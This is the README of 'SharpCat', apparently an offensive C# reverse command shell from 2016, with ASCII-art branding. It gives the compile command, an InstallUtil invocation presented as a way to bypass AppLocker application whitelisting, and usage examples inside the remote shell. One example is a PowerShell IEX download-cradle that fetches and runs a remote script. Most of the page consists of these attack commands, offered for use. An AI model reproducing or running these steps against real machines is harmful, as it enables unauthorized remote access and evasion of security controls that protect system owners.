```
  _________.__                        _________         __   
 /   _____/|  |__ _____ _____________ \_   ___ \_____ _/  |_ 
 \_____  \ |  |  \\__  \\_  __ \____ \/    \  \/\__  \\   __\
 /        \|   Y  \/ __ \|  | \/  |_> >     \____/ __ \|  |  
/_______  /|___|  (____  /__|  |   __/ \______  (____  /__|  
        \/      \/     \/      |__|           \/     \/      
                                                        v0.1
```

A Simple Reversed Command Shell which can be started using InstallUtil (Bypassing AppLocker) - by Cn33liz 2016

Compile:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe  /out:"C:\Utils\SharpCat.exe" /platform:anycpu "C:\Utils\SharpCat.cs"
```

To Bypass Applocker:

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Utils\SharpCat.exe
```

### How to use it:

Within the Remote Command Shell you can run PowerShell commands as follow:
```
C:\>PowerShell "Get-Help Invoke-*"
```
Or
```
C:\>PowerShell "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/Empire/master/data/module_source/trollsploit/Get-RickAstley.ps1'); Get-RickAstley" 
```
